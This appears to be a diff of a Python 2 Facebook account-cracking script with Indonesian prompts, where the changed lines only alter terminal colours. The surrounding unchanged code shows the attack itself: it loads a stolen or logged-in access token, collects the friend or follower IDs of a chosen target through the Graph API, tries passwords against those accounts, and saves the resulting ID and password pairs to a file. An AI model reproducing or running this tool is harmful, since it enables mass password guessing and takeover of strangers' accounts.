@@ -116,15 +116,15 @@ def __raka_sayang_amanda__():
         else:
 		exit(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Wronk input")
 _raka_banner_ = ("""
-\033[0;32m       $$$$$$$$\ $$\                             $$$$$$$\  
-\033[0;32m      $$  _____|$$ |                            $$  __$$\ 
+\033[0;31m       $$$$$$$$\ $$\                             $$$$$$$\  
+\033[0;31m      $$  _____|$$ |                            $$  __$$\ 
 \033[0;32m     $$ |      $$ | $$$$$$\   $$$$$$\          $$ |  $$ |
-\033[0;36m    $$$$$\    $$ |$$  __$$\  \____$$\ $$$$$$\ $$$$$$$  |
-\033[0;36m   $$  __|   $$ |$$ /  $$ | $$$$$$$ |\______|$$  __$$< 
-\033[0;36m  $$ |      $$ |$$ |  $$ |$$  __$$ |        $$ |  $$ |
-\033[0;33m $$$$$$$$\ $$ |\$$$$$$$ |\$$$$$$$ |        $$ |  $$ |
-\033[0;33m\________|\__| \____$$ | \_______|        \__|  \__|
-\033[0;33m             $$\   $$ |                            
+\033[0;32m    $$$$$\    $$ |$$  __$$\  \____$$\ $$$$$$\ $$$$$$$  |
+\033[0;33m   $$  __|   $$ |$$ /  $$ | $$$$$$$ |\______|$$  __$$< 
+\033[0;33m  $$ |      $$ |$$ |  $$ |$$  __$$ |        $$ |  $$ |
+\033[0;36m $$$$$$$$\ $$ |\$$$$$$$ |\$$$$$$$ |        $$ |  $$ |
+\033[0;36m\________|\__| \____$$ | \_______|        \__|  \__|
+\033[0;35m             $$\   $$ |                            
 \033[0;35m            \$$$$$$  |                            
 \033[0;35m            \______/                             
              """)
@@ -152,8 +152,8 @@ def __menu__():
 		raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Tidak ada koneksi internet");exit
         os.system('clear')
 	print(_raka_banner_)
-	print("\n \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Nama Account  : " +name)
-	print(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Tanggal Lahir : "+birthday)
+	print("\n \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Nama Account  : \033[0;36m" +name)
+	print(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Tanggal Lahir : \033[0;36m"+birthday)
 	raka("\n \033[0;37m[\033[0;36m1\033[0;37m]\033[0;00m Crack Id Dari Publik")
 	print(" \033[0;37m[\033[0;36m2\033[0;37m]\033[0;00m Crack Id Dari Followers")
 	print(" \033[0;37m[\033[0;36m3\033[0;37m]\033[0;00m Chek Results Crack")
@@ -162,12 +162,12 @@ def __menu__():
 	if _naruto_kurama_ == "":
 		raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Wronk input ");exit
 	elif _naruto_kurama_ == "1" or _naruto_kurama_ == "01":
-		idt = raw_input(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Target : ")
+		idt = raw_input(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Target : \033[0;36m")
 		try:
 			token=open('login.txt','r').read()
 			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			sp = json.loads(pok.text)
-			raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Nama : "+sp["name"])
+			raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Nama : \033[0;36m"+sp["name"])
 		except KeyError:
 			raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Target tidak ditemukan");exit
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
@@ -176,12 +176,12 @@ def __menu__():
 			uid = i['id']
 			id.append(uid)
 	elif _naruto_kurama_ == "2" or _naruto_kurama_ == "02":
-		idt = raw_input(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Target : ")
+		idt = raw_input(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Target : \033[0;36m")
 		try:
 			token=open('login.txt','r').read()
 			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			sp = json.loads(pok.text)
-			raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Nama : "+sp["name"])
+			raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Nama : \033[0;36m"+sp["name"])
 		except KeyError:
 			raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Target tidak di temukan");exit
 		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=5000&access_token="+token)
@@ -197,7 +197,7 @@ def __menu__():
 		raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Terimakasih telah terhubung di tools saya");exit
 	else:
 		raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Wronk input");exit
-	raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Total id : "+str(len(id)))
+	raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Total id : \033[0;36m"+str(len(id)))
 	print(' ')
 	def main(arg):
 		global ok,cp,ua, loop
@@ -243,7 +243,7 @@ def __menu__():
 					continue
 					continue
 				elif "www.facebook.com" in send.json()["error_msg"]:
-					print '\r\033[1;93m[Cp] '+uid+'|'+pw+'|'+nama
+					print '\r\033[1;96m[Cp] '+uid+'|'+pw+'|'+nama
 					cp.append(uid+'|'+pw)
 					save = open('Cp.json','a')
 					save.write(str(uid)+'|'+str(pw)+'\n')
